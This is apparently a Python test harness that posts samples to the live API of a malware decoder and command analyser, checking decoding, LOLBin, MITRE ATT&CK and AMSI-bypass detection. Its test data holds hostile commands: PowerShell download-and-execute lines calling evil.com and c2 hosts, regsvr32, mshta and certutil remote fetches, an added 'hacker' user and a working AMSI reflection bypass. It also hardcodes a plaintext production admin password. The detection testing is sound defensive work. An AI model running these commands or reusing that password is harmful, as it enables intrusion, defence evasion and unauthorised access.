"""Production validation harness — https://nivxray.nivxforge.com
=================================================================

Fires 40+ canonical samples covering all 20 regression categories against
the LIVE production endpoints via HTTP. Validates:

  * Decoder pipeline (POST /api/decode/magic)
  * Command analyzer (POST /api/analyze/command)
  * Training notes flow (POST /api/admin/models + composer verify + DELETE)
  * Golden malware benchmark (POST /api/admin/samples/benchmark/all)
  * Health / auth / basic UI endpoints

Strict: any 5xx, any non-recovered marker, any missing MITRE ID, any missing
LOLBin — blocker. Cleans up any state it created regardless of outcome.
"""
from __future__ import annotations

import base64
import gzip
import sys
import time
from typing import Any, Dict, List, Tuple

import requests

PROD = "https://nivxray.nivxforge.com"
EMAIL = "admin@nivxray.com"
PW = "NivXRay#2026!"

session = requests.Session()
session.headers.update({"User-Agent": "nivxray-prod-validator/1.0"})

# Fail-fast HTTP timeouts (connect, read)
TIMEOUT = (10, 60)


def _post(path: str, json_body: dict, token: str | None = None) -> requests.Response:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    return session.post(f"{PROD}{path}", json=json_body, headers=headers, timeout=TIMEOUT)


def _get(path: str, token: str | None = None) -> requests.Response:
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    return session.get(f"{PROD}{path}", headers=headers, timeout=TIMEOUT)


def _delete(path: str, token: str) -> requests.Response:
    return session.delete(f"{PROD}{path}", headers={"Authorization": f"Bearer {token}"}, timeout=TIMEOUT)


# =============================================================================
# Test bank — 40+ samples across all categories
# =============================================================================
def _b64(s: bytes | str) -> str:
    if isinstance(s, str):
        s = s.encode()
    return base64.b64encode(s).decode()


def _ps_enc(s: str) -> str:
    return base64.b64encode(s.encode("utf-16-le")).decode()


def _xor(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)


# ---------- Decoder pipeline tests ----------
def decode_test(name: str, payload: str, needle: str, token: str, max_depth: int = 4) -> Tuple[bool, str]:
    """POST /api/decode/magic → verify needle appears in any top result."""
    try:
        r = _post("/api/decode/magic", {"input": payload, "max_depth": max_depth, "top_n": 5}, token=token)
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}: {r.text[:200]}"
        data = r.json()
        outputs = [(t.get("output") or "") for t in (data.get("top_results") or [])]
        if any(needle in o for o in outputs):
            return True, f"found in top_{len(outputs)}"
        return False, f"needle `{needle[:30]}` missing from {[o[:60] for o in outputs[:3]]}"
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"


# ---------- Command analyzer tests ----------
def cmd_test(name: str, cmd: str, expect: Dict[str, Any], token: str) -> Tuple[bool, str]:
    """POST /api/analyze/command → verify LOLBins / MITRE / AMSI / decoded content."""
    try:
        r = _post("/api/analyze/command", {"input": cmd}, token=token)
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}: {r.text[:200]}"
        d = r.json()
        # Interpreter
        if "interpreter" in expect:
            got = (d.get("parsed_structure") or {}).get("interpreter")
            if got != expect["interpreter"]:
                return False, f"interpreter got={got} want={expect['interpreter']}"
        # LOLBin
        if "lolbin" in expect:
            names = [l["name"] for l in (d.get("lolbins") or [])]
            if expect["lolbin"] not in names:
                return False, f"lolbin `{expect['lolbin']}` missing from {names}"
        # MITRE
        if "mitre" in expect:
            ids = [m["id"] for m in (d.get("mitre") or [])]
            if expect["mitre"] not in ids:
                return False, f"mitre `{expect['mitre']}` missing from {ids}"
        # AMSI
        if "amsi" in expect:
            got = (d.get("amsi_bypass") or {}).get("detected", False)
            if got != expect["amsi"]:
                return False, f"amsi.detected got={got} want={expect['amsi']}"
        # Decoded content
        if "decoded_contains" in expect:
            combined = "\n".join(c.get("final_output") or "" for c in (d.get("decode_chains") or []))
            if expect["decoded_contains"] not in combined:
                return False, f"decoded chain missing `{expect['decoded_contains']}`. got: {combined[:180]!r}"
        return True, "ok"
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"


# =============================================================================
# Suite runner
# =============================================================================
def main() -> int:
    print(f"╔══════════════════════════════════════════════════════════╗")
    print(f"║  NivXRay Production Validator                             ║")
    print(f"║  Target: {PROD:<47} ║")
    print(f"╚══════════════════════════════════════════════════════════╝\n")

    results: List[Tuple[str, bool, str]] = []

    def rec(name: str, ok: bool, note: str) -> None:
        results.append((name, ok, note))
        print(f"  {'✅' if ok else '❌'}  {name:<55}  {note}")

    # ---------- 0. Health + auth ----------
    print("[0] HEALTH + AUTH")
    try:
        r = session.get(f"{PROD}/api/", timeout=TIMEOUT)
        rec("health-check", r.status_code in (200, 404), f"HTTP {r.status_code}")
    except Exception as e:
        rec("health-check", False, str(e))

    try:
        r = _post("/api/auth/login", {"email": EMAIL, "password": PW})
        token = r.json().get("access_token")
        rec("admin-login", r.status_code == 200 and bool(token), "token acquired" if token else f"HTTP {r.status_code}")
    except Exception as e:
        rec("admin-login", False, str(e))
        token = None

    if not token:
        print("\nABORT: cannot obtain admin token")
        return 1

    # ---------- 1. Base64 flat (5) ----------
    print("\n[1] BASE64 FLAT")
    for pt in ["hello world", "curl http://c2.example.com/x",
               "IEX (New-Object Net.WebClient)",
               "cmd.exe /c whoami", "net user hacker /add"]:
        ok, note = decode_test(f"base64({pt[:30]})", _b64(pt), pt[:12], token)
        rec(f"S1 base64 `{pt[:35]}`", ok, note)

    # ---------- 2. Nested Base64 (3) ----------
    print("\n[2] NESTED BASE64 (double / triple)")
    for pt, depth in [("Layer0 secret", 2), ("cmd /c whoami", 3), ("quad c2 beacon", 4)]:
        p = pt
        for _ in range(depth):
            p = _b64(p)
        ok, note = decode_test(f"nested-{depth}", p, pt[:12], token, max_depth=depth + 2)
        rec(f"S2 nested-b64 depth={depth}", ok, note)

    # ---------- 3. Gzip / Zlib / LZMA / Bzip2 (4) ----------
    print("\n[3] COMPRESSION WRAPPERS")
    pt = "IEX (New-Object Net.WebClient).DownloadString('http://c2/x')"
    ok, note = decode_test("gzip", _b64(gzip.compress(pt.encode())), "DownloadString", token)
    rec("S3 base64+gzip", ok, note)

    import zlib
    ok, note = decode_test("zlib", _b64(zlib.compress(pt.encode())), "DownloadString", token)
    rec("S3 base64+zlib", ok, note)

    import lzma
    ok, note = decode_test("lzma", _b64(lzma.compress(pt.encode())), "DownloadString", token)
    rec("S3 base64+lzma", ok, note)

    import bz2
    ok, note = decode_test("bzip2", _b64(bz2.compress(pt.encode())), "DownloadString", token)
    rec("S3 base64+bzip2", ok, note)

    # ---------- 4. Base64 + XOR (3) ----------
    print("\n[4] BASE64 + XOR (outer -bxor wrapper)")
    for pt, key in [("hello xor world", 0x23), ("SHELLCODE_MARKER_ABC", 0x2A), ("keyloggerActive", 0x77)]:
        xored = _xor(pt.encode(), key)
        outer = (f'$c = [Convert]::FromBase64String("{_b64(xored)}")\n'
                 f'for ($x=0; $x -lt $c.Count; $x++) {{ $c[$x] = $c[$x] -bxor {key} }}')
        ok, note = decode_test(f"xor(0x{key:02X})", outer, pt[:10], token)
        rec(f"S4 base64+xor {pt[:25]}", ok, note)

    # ---------- 5. UTF-16LE PS-Enc (via command analyzer, needs auth) ----------
    print("\n[5] POWERSHELL -ENC (UTF-16LE)")
    ps_cases = [
        "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')",
        "Get-Process | Where-Object {$_.Name -like '*chrome*'}",
        "Start-Process powershell -ArgumentList '-nop -w hidden -c calc.exe'",
    ]
    for inner in ps_cases:
        cmd = f"powershell.exe -NoP -W Hidden -Enc {_ps_enc(inner)}"
        ok, note = cmd_test("", cmd, {"interpreter": "powershell", "decoded_contains": inner[:20]}, token)
        rec(f"S5 -Enc `{inner[:35]}`", ok, note)

    # ---------- 6. LOLBins (5) ----------
    print("\n[6] LOLBIN DETECTION")
    for cmd, expected in [
        ("rundll32.exe user32.dll,LockWorkStation",         "rundll32"),
        ("regsvr32 /s /u /n /i:http://x/y.sct scrobj.dll",  "regsvr32"),
        ("mshta http://x/y.hta",                             "mshta"),
        ("certutil.exe -urlcache -f http://x/y a",          "certutil"),
        ("powershell -c 'iex; rundll32 evil.dll,Main'",     "rundll32"),  # nested — my fix
    ]:
        ok, note = cmd_test("", cmd, {"lolbin": expected}, token)
        rec(f"S6 LOLBin `{expected}`", ok, note)

    # ---------- 7. MITRE mapping (6) ----------
    print("\n[7] MITRE ATT&CK MAPPING")
    for cmd, tid in [
        ("powershell -Enc SGVsbG8=",                                     "T1059.001"),
        ("(New-Object Net.WebClient).DownloadString('http://x/y')",      "T1105"),
        ("curl -o payload.exe http://mal.example.com/loader",            "T1105"),  # my new rule
        ("certutil -decode a.b64 b.exe",                                 "T1140"),
        ("rundll32.exe user32.dll,LockWorkStation",                      "T1218.011"),
        ("schtasks /create /sc minute /mo 1 /tn Update /tr calc",         "T1053.005"),
    ]:
        ok, note = cmd_test("", cmd, {"mitre": tid}, token)
        rec(f"S7 MITRE {tid}", ok, note)

    # ---------- 8. AMSI bypass detection (2) ----------
    print("\n[8] AMSI BYPASS DETECTION")
    amsi_cmd = ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
                ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    ok, note = cmd_test("", amsi_cmd, {"amsi": True, "mitre": "T1562.001"}, token)
    rec("S8 AMSI reflection-setvalue", ok, note)

    ok, note = cmd_test("", "Get-ChildItem C:\\Users", {"amsi": False}, token)
    rec("S8 AMSI no-false-positive", ok, note)

    # ---------- 9. Multi-stage E2E (byte-preservation regression) ----------
    print("\n[9] MULTI-STAGE END-TO-END (byte-preservation gate)")
    inner_bytes = b"MARKER_STAGER_UNMASKED"
    xored = _xor(inner_bytes, 0x23)
    inner_b64 = _b64(xored)
    outer_script = (f'$var_code = [Convert]::FromBase64String("{inner_b64}")\n'
                    f'for ($x=0; $x -lt $var_code.Count; $x++) {{ $var_code[$x] = $var_code[$x] -bxor 35 }}')
    gz = gzip.compress(outer_script.encode())
    outer_b64 = _b64(gz)
    payload = f'[Convert]::FromBase64String("{outer_b64}")'
    ok, note = decode_test("gzip→b64→xor", payload, "MARKER_STAGER_UNMASKED", token, max_depth=6)
    rec("S9 recursive b64→gzip→b64→xor", ok, note)

    # ---------- 10. Golden benchmark ----------
    print("\n[10] GOLDEN MALWARE BENCHMARK")
    try:
        r = _post("/api/admin/samples/benchmark/all", {}, token=token)
        if r.status_code == 200:
            j = r.json()
            pct = j.get("pass_pct", 0)
            ok = pct == 100.0
            rec("S10 benchmark 100%", ok, f"{j.get('passed',0)}/{j.get('total',0)} = {pct}%")
        else:
            rec("S10 benchmark", False, f"HTTP {r.status_code}: {r.text[:120]}")
    except Exception as e:
        rec("S10 benchmark", False, str(e))

    # ---------- 11. Training Notes flow (create → verify → delete) ----------
    print("\n[11] TRAINING NOTES FEATURE (NEW)")
    tn_id = None
    try:
        r = _post("/api/admin/models",
                  {"kind": "training_note", "name": "PROD_VALIDATOR_regression",
                   "enabled": True,
                   "config": {"body": "ALWAYS defang IOCs in the final SOC report. Never leave live URLs."}},
                  token=token)
        if r.status_code == 200:
            tn_id = r.json().get("id")
            rec("S11 create training_note", bool(tn_id), f"id={tn_id}")
        else:
            rec("S11 create training_note", False, f"HTTP {r.status_code}: {r.text[:180]}")

        # List and verify it appears
        r = _get("/api/admin/models?kind=training_note", token=token)
        if r.status_code == 200:
            names = [n.get("name") for n in r.json()]
            rec("S11 list training_notes",
                "PROD_VALIDATOR_regression" in names,
                f"found in {len(names)} note(s)")
        else:
            rec("S11 list training_notes", False, f"HTTP {r.status_code}")

        # Verify feedback fields present (present as ints, or absent → treated as 0)
        if r.status_code == 200:
            hit = next((n for n in r.json() if n.get("name") == "PROD_VALIDATOR_regression"), None)
            if hit:
                # A fresh note may not have feedback_* fields yet (they're
                # created lazily on first vote). Accept either present-as-int
                # OR absent (missing key). Fail only if present-as-non-int.
                def _ok_field(k: str) -> bool:
                    v = hit.get(k)
                    return v is None or isinstance(v, int)
                has_fb = all(_ok_field(k) for k in ("feedback_pos", "feedback_neg", "feedback_weight"))
                pos = hit.get("feedback_pos") or 0
                neg = hit.get("feedback_neg") or 0
                weight = hit.get("feedback_weight") or 0
                rec("S11 feedback fields present", has_fb, f"pos={pos} neg={neg} weight={weight}")
            else:
                rec("S11 feedback fields present", False, "training_note not found in list")
    finally:
        if tn_id:
            r = _delete(f"/api/admin/models/{tn_id}", token=token)
            rec("S11 cleanup training_note", r.status_code == 200, f"HTTP {r.status_code}")

    # ---------- Final tally ----------
    total = len(results)
    passed = sum(1 for _, ok, _ in results if ok)
    failed = total - passed
    print("\n" + "═" * 62)
    print(f"  TOTAL: {total}  ·  PASSED: {passed}  ·  FAILED: {failed}")
    print("═" * 62)
    if failed:
        print("\nFAILURES:")
        for name, ok, note in results:
            if not ok:
                print(f"  ❌  {name} — {note}")
        return 1
    print("\n✅  ALL PRODUCTION CHECKS PASSED — decoder + analyzer + training notes all green.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
